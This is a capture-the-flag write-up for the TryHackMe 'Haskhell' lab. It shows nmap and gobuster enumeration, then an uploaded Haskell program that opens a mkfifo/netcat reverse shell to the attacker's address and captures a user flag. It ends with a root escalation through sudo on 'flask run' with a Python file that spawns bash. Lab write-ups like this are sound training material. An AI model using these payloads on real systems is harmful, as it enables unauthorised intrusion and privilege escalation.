HASKHELL

ENUMERATION


"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Haskhell]
└─$ sudo nmap -sS -sV -A 10.10.74.138 -oN nmap.txt
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 06:14 EST
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 06:16 (0:00:00 remaining)
Nmap scan report for 10.10.74.138
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                    
TCP/IP fingerprint:                                                                                                                                                    
OS:SCAN(V=7.92%E=4%D=2/27%OT=22%CT=1%CU=32423%PV=Y%DS=2%DC=T%G=Y%TM=621B5DC                                                                                            
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS                                                                                            
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1                                                                                            
OS:1NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   171.04 ms 10.11.0.1
2   171.52 ms 10.10.74.138

OS and Service detection performed. Please report any incorrect resu



"""

GOBUSTER

"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Haskhell]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.74.138:5001/                           
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.74.138:5001/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/27 06:18:23 Starting gobuster in directory enumeration mode
===============================================================
/submit               (Status: 200) [Size: 237]
                                               
===============================================================
2022/02/27 06:21:06 Finished
===============================================================


"""


MAKE A HASKEll SHELL AND UPLOAD IT  AND START A LISTNER


"""
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.11.61.80 7777 >/tmp/f"

"""


RESULTS 


"""

                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Haskhell]
└─$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.74.138] 36844
sh: 0: can't access tty; job control turned off
$ id
uid=1001(flask) gid=1001(flask) groups=1001(flask)
$ ls
app.py
app.pyc
__pycache__
uploads
$ cd uploads
$ ls
reverse-shell.hs
reverse-shell.hs_results.txt
shell
shell.hi
shell.hs
shell.hs_results.txt
shell.o
$ cd ..
$ ls
app.py
app.pyc
__pycache__
uploads
$ pwd
/home/flask
$ ls   
app.py
app.pyc
__pycache__
uploads
$ ls -la
total 60
drwxr-xr-x 6 flask flask 4096 May 27  2020 .
drwxr-xr-x 5 root  root  4096 May 27  2020 ..
-rw-r--r-- 1 root  root  4941 May 27  2020 app.py
-rw-r--r-- 1 flask flask 5300 May 27  2020 app.pyc
-rw-r--r-- 1 flask flask  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 flask flask 3771 Apr  4  2018 .bashrc
drwx------ 2 flask flask 4096 May 27  2020 .gnupg
drwxrwxr-x 3 flask flask 4096 May 27  2020 .local
-rw-r--r-- 1 flask flask  807 Apr  4  2018 .profile
drwxrwxr-x 2 flask flask 4096 May 27  2020 __pycache__
-rw------- 1 flask flask   38 May 27  2020 .python_history
-rw-rw-r-- 1 flask flask   66 May 27  2020 .selected_editor
drwxrwxr-x 2 flask flask 4096 Feb 27 11:38 uploads
$ cd ..
$ ls
flask
haskell
prof
$ cd prof
$ ls
__pycache__
user.txt
$ cat user.txt
flag{academic_dishonesty}
$ 



"""


PRIVELLEGE ESCALATION


"""
import os
os.system("/bin/bash")

save it 
export FLASK_APP=rev.py

sudo /usr/bin/flask run



root@haskhell:/root# ls
root.txt
root@haskhell:/root# cat root.txt
flag{im_purely_functional}
root@haskhell:/root


"""
